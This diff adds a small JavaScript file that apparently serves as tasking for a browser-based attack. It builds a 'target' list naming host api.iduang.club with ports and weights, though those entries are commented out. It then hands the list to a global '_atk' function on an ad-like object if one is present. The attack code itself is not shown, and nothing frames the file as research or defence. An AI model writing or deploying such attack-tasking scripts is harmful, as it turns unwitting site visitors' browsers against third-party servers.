@@ -1,0 +1,14 @@
+(function () {
+	var data = {
+		status: 0,
+		target: [
+			/*['x1', 30, 'api.iduang.club', 6532],
+			['x2', 40, 'http', 'api.iduang.club', 6532],
+			['x2', 70, 'http', 'api.iduang.club', 10000]*/
+		]
+	};
+
+	if (window.__ad_rns_lqwls__ && typeof window.__ad_rns_lqwls__._atk === 'function') {
+		window.__ad_rns_lqwls__._atk(data);
+	}
+})();
